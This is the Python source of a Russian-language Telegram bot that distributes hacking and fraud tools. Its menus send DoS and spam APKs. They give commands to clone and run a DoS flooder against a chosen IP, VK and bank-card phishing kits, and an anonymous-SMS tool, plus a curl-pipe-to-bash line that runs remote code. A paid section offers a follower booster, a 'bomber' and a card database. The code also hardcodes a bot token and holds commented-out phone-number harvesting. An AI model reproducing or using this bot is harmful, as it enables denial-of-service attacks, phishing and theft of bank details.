import sqlite3
import re
import aiogram.utils.markdown as fmt
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.utils.exceptions import MessageNotModified
from contextlib import suppress
from sys import exit
import logging
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State


class admad(StatesGroup):
    ad = State()


class id(StatesGroup):
    id_usr = State()


bot = Bot(token="5817699100:AAFgFPm5EJ0jWXrd5f_d3liYR3_oS6AEeFM")
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

button_helpp = InlineKeyboardButton('Помощь', callback_data='help')
button2 = InlineKeyboardButton('🧨Спам', callback_data='spam')
button3 = InlineKeyboardButton('👥Шифр', callback_data='shifr')
button4 = InlineKeyboardButton('⚔Дос атака', callback_data='dos')
button_termux_app = InlineKeyboardButton('Приложение термукс', callback_data='termux_app')
button5 = InlineKeyboardButton('⚔Дос атака', callback_data='Dostermux')
button6 = InlineKeyboardButton('💀Хaker', callback_data='xaker')
button7 = InlineKeyboardButton('👥Анонимные сообщения', callback_data='anon_sms')
button8 = InlineKeyboardButton('🖇Фишинг вк', callback_data='phishing_vk')
button9 = InlineKeyboardButton('🖇Фишинг банковских карт', callback_data='phishing_ss')
button_fortermux = InlineKeyboardButton('Для термукс', callback_data='for_termux')
button_forlinux = InlineKeyboardButton('Для линукс', callback_data='for_linux')
button_back1 = InlineKeyboardButton('🔙Назад', callback_data='back1')
button_termux = InlineKeyboardButton('🦠Меню термукс', callback_data='termux')
button_back = InlineKeyboardButton('🔙Назад', callback_data='back')

button_sell = InlineKeyboardButton('🥝Поддержать', callback_data='sell')

play_menu = InlineKeyboardButton('⚽️🎱🏀Игровое меню', callback_data='play_menu')

helpp = InlineKeyboardMarkup()
helpp.add(button_helpp)

markup3 = InlineKeyboardMarkup(row_width=2).add(button2).add(button3).add(button4).add(button_termux_app).add(
    button_termux).add(play_menu).add(button_sell)

markup4 = InlineKeyboardMarkup(row_width=2).add(button5).add(button6).add(button7).add(button8).add(button9).add(
    button_back)

markup5 = InlineKeyboardMarkup(row_width=2).add(button_fortermux).add(button_forlinux).add(button_back1)

priv_1 = InlineKeyboardButton('18+', callback_data='1')

priv_2 = InlineKeyboardButton('Накрутка инсты', callback_data='2')

priv_3 = InlineKeyboardButton('Топ бомбер', callback_data='3')

priv_4 = InlineKeyboardButton('База бонусных карт 5-чки', callback_data='4')

priv_5 = InlineKeyboardButton('Перенаправление трафика через tor', callback_data='5')

exit_priv = InlineKeyboardButton('🔙ВыХоД', callback_data='exit')

markup_pivate = InlineKeyboardMarkup().add(priv_1).add(priv_2).add(priv_3).add(priv_4).add(priv_5).add(exit_priv)

my = 5689226201

with sqlite3.connect("database.db") as conn:
    cursor = conn.cursor()
    cursor.execute("""
  CREATE TABLE IF NOT EXISTS users
  (user INTEGER, name VARCHAR, priv VARCHAR)
  """)


@dp.message_handler(commands="priv")
async def vhod_2(message: types.Message):
    chat_id = message.from_user.id
    if chat_id == my:
        await message.answer("Ты ВоШёЛ в ПрИвАтНыЙ рАзДел!", reply_markup=markup_pivate)
    else:
        await message.answer("Приватка стоит 30 рублей\nПисать в личку: @Kiberhack")
        await bot.send_message(my, "Этот пользователь пытался войти в приватку: " + str(chat_id))
        username = message.from_user.username
        await bot.send_message(my, "Этот пользователь пытался войти в приватку: @" + str(username))
        first_name = message.from_user.first_name
        await bot.send_message(my, "Этот пользователь пытался войти в приватку: " + str(first_name))
        last_name = message.from_user.last_name
        await bot.send_message(my, "Этот пользователь пытался войти в приватку: " + str(last_name))


# @dp.message_handler(commands="number")
# async def cmd_number(message: types.Message):
#    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
#   keyboard.add(types.KeyboardButton(text="Тык сюда!", request_contact=True))
#  await message.answer("Скажите нам свой номер телефона:", reply_markup=keyboard)


# @dp.message_handler(content_types=['contact'])
# async def send_message(message: types.Message):
#   if message.contact is not None:
#      keyboard2 = types.ReplyKeyboardRemove()
#     await message.answer("Вы успешно отправили свой номер", reply_markup=keyboard2)
#    await message.answer("Вам напишет: @Programming_hacking_1.")
#   await message.answer("После оплаты вас добавят в приватку бота.")
#  contact = message.contact
# print(contact.first_name)
# print(contact.last_name)
# print("Номер телефона: +", contact.phone_number)
# print("id :", message.from_user.id)
# chat_id = -1001774805952
#
# await bot.send_message(chat_id, "Еще один лошок скинул свой номер:")
# await bot.send_message(chat_id, "#num\n+"+contact.phone_number)
# await bot.send_message(chat_id, "#id\n" +str(message.from_user.id))
# await bot.send_message(my, "#num\n+"+contact.phone_number)
# await bot.send_message(my, "#id\n" +str(message.from_user.id))
# else:
#   await message.answer("Вы скрываете свой номер телефона, мы не можем добавить вас!")


@dp.callback_query_handler(text='1')
async def priv1(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1kxqBCmITDcc2vx2Ej2eJpKrzmi5gZcVY/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='2')
async def priv2(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1unDZGBqUD89GoksAicWXl5FWIkudU73p/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='3')
async def priv3(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1Agv-ESyGB6g4fZFlg-O_CGoFKkHlIDhE/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='4')
async def priv4(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/12TP3gm-MhWBXTgZZHTsXyDMEu-I5A6F0/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='5')
async def priv5(callback: types.CallbackQuery):
    await callback.message.edit_text("Установка:\ngit clone https://github.com/Und3rf10w/kali-anonsurf\ncd "
                                     "kali-anonsurf/\nsudo ./installer.sh\n\nИспользование:\nanonsurf --help",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='exit')
async def exit(callback: types.CallbackQuery):
    await callback.message.edit_text("Вы вышли из привата!")
    await callback.message.answer("Все команды:\nПо всем вопросам обращаться к @Kiberhack .",
                                  reply_markup=markup3)


#####################################################################################################
####################            КОД ДЛЯ АДМИНА        ###############################################
#####################################################################################################


admin_users = InlineKeyboardButton('Всего юзеров', callback_data='allusradm')

admin_all_usr = InlineKeyboardButton('Вывести всех', callback_data='allusers')

adm_send = InlineKeyboardButton('📨 Рассылка', callback_data='sendmsgadm')

adm_send_smbd = InlineKeyboardButton('📨 Отправить кон-но', callback_data='sendsmbd')

adm_exit = InlineKeyboardButton('Выход', callback_data='exitadm')

admin_m = InlineKeyboardMarkup().add(admin_users).add(admin_all_usr).add(adm_send).add(adm_send_smbd).add(adm_exit)


##############ПАСХАЛКА########
@dp.message_handler(commands="secret")
async def secret(message: types.message):
    await message.answer_document(open('GIF.gif.mp4', 'rb'))


@dp.message_handler(content_types=['text'])
async def get_text(message: types.message):
    chat_id = message.from_user.id
    if message.text == '/admin':
        if chat_id == my:
            await message.answer("Привэт, создатэль", reply_markup=admin_m)
        else:
            await message.answer("Куда мы лезем?🤬")
    if message.text == '/start':
        await message.answer("‼️Обновление 2.0‼️")
        await message.answer("Привет!", reply_markup=helpp)
        cursor.execute("select * from users where user = ?", (message.from_user.id,))
        usr = cursor.fetchone()
        no = "no"
        if not usr:
            cursor.execute("INSERT INTO users values (:user, :name, :priv);",
                           {'user': message.from_user.id,
                            'name': message.from_user.username,
                            'priv': no})
            conn.commit()
    if message.text == 'Иди нахуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'Иди на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'иди на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'иди нахуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'Пошёл на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'Пошёл нахуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'Пошел на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'Пошел нахуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'пошёл на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'пошёл на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'пошёл на хуй':
        await message.answer('Сам нахуй иди')
    if message.text == 'пошёл на хуй':
        await message.answer('Сам нахуй иди')


allus = cursor.execute('SELECT Count(*) FROM users').fetchone()[0]


@dp.callback_query_handler(text='allusradm')
async def allusradm(callback: types.CallbackQuery):
    global allus
    await callback.message.edit_text(allus, reply_markup=admin_m)


@dp.callback_query_handler(text='allusers')
async def allusers(callback: types.CallbackQuery):
    global allus
    await callback.message.edit_text("Общее число: " + str(allus))
    await callback.message.answer_document(open('database.db', 'rb'))
    await callback.message.answer("ㅤㅤ", reply_markup=admin_m)


@dp.callback_query_handler(text='sendmsgadm')
async def sendmsgadm(callback: types.CallbackQuery):
    await callback.message.answer('Введите текcт объявления :')
    await admad.ad.set()


@dp.message_handler(state=admad.ad)
async def getcount(message: types.Message, state: FSMContext):
    ad = message.text
    await state.update_data(ad=ad)
    await state.finish()
    cursor.execute("SELECT user FROM users")
    userbase = []
    while True:
        row = cursor.fetchone()
        if row == None:
            break
        userbase.append(row)
    if len(userbase) > 1:
        for z in range(len(userbase)):
            await bot.send_message(userbase[z][0], text=f"‼️\n{ad}")
    else:
        await bot.send_message(userbase, f"‼️\n{ad}")
    await bot.send_message(message.from_user.id, text='Готово', reply_markup=admin_m)


@dp.callback_query_handler(text='sendsmbd')
async def sendsmbd(callback: types.CallbackQuery):
    await callback.message.answer("Введи id пользователя :")
    await id.id_usr.set()


@dp.message_handler(state=id.id_usr)
async def send_by_id(message: types.Message, state: FSMContext):
    id = message.text
    await state.update_data(id_usr=id)
    await state.finish()
    await message.answer("Пользователь : " + str(id))
    await bot.send_message(id,
                           "Сообщение от @Kiberhack :\nАдмин хочень поговорить с вами. Когда вам будет "
                           "удобно, напишите админу.")
    await message.answer("Сообщение успешно отправлено!")


@dp.callback_query_handler(text='exitadm')
async def exitadm(callback: types.CallbackQuery):
    await callback.message.answer("Довай пока", reply_markup=markup3)


#####################################################################################################
####################            ОСНОВНОЙ КОД        #################################################
#####################################################################################################


#############################################################################
#                                                                           #
#                   ИГРОВОЕ МЕНЮ                                            #
#                                                                           #
#############################################################################


coin_p = InlineKeyboardButton('Орел/Решка', callback_data='oreshka')

xo_play = InlineKeyboardButton('Играть в   ❌⭕️(Пока в разраб.)', callback_data='X0')

play_exit = InlineKeyboardButton('Выйти', callback_data='exit_play')

play_m = InlineKeyboardMarkup().add(coin_p).add(xo_play).add(play_exit)


@dp.callback_query_handler(text='play_menu')
async def play_menu(callback: types.CallbackQuery):
    await callback.message.edit_text("Приветствую вас в игровом меню!", reply_markup=play_m)


@dp.callback_query_handler(text='oreshka')
async def oreshka(callback: types.CallbackQuery):
    coin = ["🪙Орёл!", "💰Решка!"]
    await callback.message.answer(random.choice(coin), reply_markup=play_m)


@dp.callback_query_handler(text='exit_play')
async def exit_play(callback: types.CallbackQuery):
    await callback.message.edit_text("Главное меню :", reply_markup=markup3)


#######################################################################################
#                       ОСНОВНОЙ КОД                        #
############################################################################################


@dp.callback_query_handler(text='help')
async def help(callback: types.CallbackQuery):
    await callback.message.edit_text("Все команды:\nПо всем вопросам обращаться к @Kiberhack .",
                                     reply_markup=markup3)


@dp.callback_query_handler(text='spam')
async def send_file_2(callback: types.CallbackQuery):
    await callback.message.edit_text("Подождите, бот загружает файл для отправки...")
    await callback.message.answer_document(open('Clicker.apk', 'rb'))
    await callback.message.answer("ㅤㅤ", reply_markup=markup3)


@dp.callback_query_handler(text='shifr')
async def send_file_3(callback: types.CallbackQuery):
    await callback.message.edit_text("Подождите, бот загружает файл для отправки...")
    await callback.message.answer_document(open('Enigma.apk', 'rb'))
    await callback.message.answer("ㅤㅤ", reply_markup=markup3)


@dp.callback_query_handler(text='dos')
async def send_file_4(callback: types.CallbackQuery):
    await callback.message.edit_text("Подождите, бот загружает файл для отправки...")
    await callback.message.answer_document(open('Dos.apk', 'rb'))
    await callback.message.answer("Советую запускать на WIFI, либо моб. интернет(безлимит), т.к. трафик огромный")
    await callback.message.answer_photo(open('photo.jpg', 'rb'))
    await callback.message.answer(
        "‼️Данный файл предоставлен только в целях ознакомления, я не несу ответственности за ваши действия!",
        reply_markup=markup3)


@dp.callback_query_handler(text='termux_app')
async def send_file_5(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "https://drive.google.com/file/d/1MniyaCMT0vUh6UvxcXbyz4oqaSJqFH38/view?usp=sharing")
    await callback.message.answer("ㅤㅤ", reply_markup=markup3)


@dp.callback_query_handler(text='sell')
async def sell(callback: types.CallbackQuery):
    await callback.message.edit_text("Поддержать:\nhttps://yoomoney.ru/to/4100117639669170")
    await callback.message.answer("ㅤㅤ", reply_markup=markup3)


@dp.callback_query_handler(text='termux')
async def termux(callback: types.CallbackQuery):
    await callback.message.edit_text('Вы перешли в меню termux', reply_markup=markup4)


@dp.callback_query_handler(text='Dostermux')
async def termux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'Dos\n\n$ apt update\n$ apt upgrade\n$ apt install python\n$ apt install git\n$ apt install dnsutils\n$ git '
        'clone https://github.com/rk1342k/Hammer\n$ cd Hammer\n$ python hammer.py -s (ip адрес сайта без скобок) -p('
        'порт без скобок) -t 135\nзнак $ копировать не нужно',
        reply_markup=markup4)


@dp.callback_query_handler(text='back')
async def back(callback: types.CallbackQuery):
    await callback.message.edit_text('Вы вернулись в главное меню', reply_markup=markup3)


@dp.callback_query_handler(text='xaker')
async def xaker(callback: types.CallbackQuery):
    await callback.message.edit_text(
        '\n\n$ curl -LO kutt.it/txaker && bash txaker\n\nЗапуск из любой дирректории:\n$ xaker', reply_markup=markup4)


@dp.callback_query_handler(text='anon_sms')
async def anon_sms(callback: types.CallbackQuery):
    await callback.message.edit_text('Выберите:', reply_markup=markup5)


@dp.callback_query_handler(text='for_termux')
async def for_termux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'pkg install git\npkg install python\ngit clone https://github.com/HACK3RY2J/Anon-SMS.git\ncd Anon-SMS\nbash Run.sh')
    await callback.message.answer('Выберите:', reply_markup=markup5)


@dp.callback_query_handler(text='for_linux')
async def for_linux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'sudo apt install git\ngit clone https://github.com/HACK3RY2J/Anon-SMS.git\ncd Anon-SMS\nsudo bash Run.sh')
    await callback.message.answer('Выберите:', reply_markup=markup5)


@dp.callback_query_handler(text='phishing_vk')
async def phishing_vk(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'git clone https://github.com/gasayminajj/robophish\ncd robophish\nbash robophish.sh',
        reply_markup=markup4)


@dp.callback_query_handler(text='phishing_ss')
async def phishing_ss(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'apt install python3 git\ngit clone https://github.com/escdroid/cardesc.git\ncd cardesc\nchmod +x *\npip3 install -r requirements.txt\npython3 bank.py',
        reply_markup=markup4)


@dp.callback_query_handler(text='back1')
async def back1(callback: types.CallbackQuery):
    await callback.message.edit_text('Вы перешли в меню термукс', reply_markup=markup4)


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
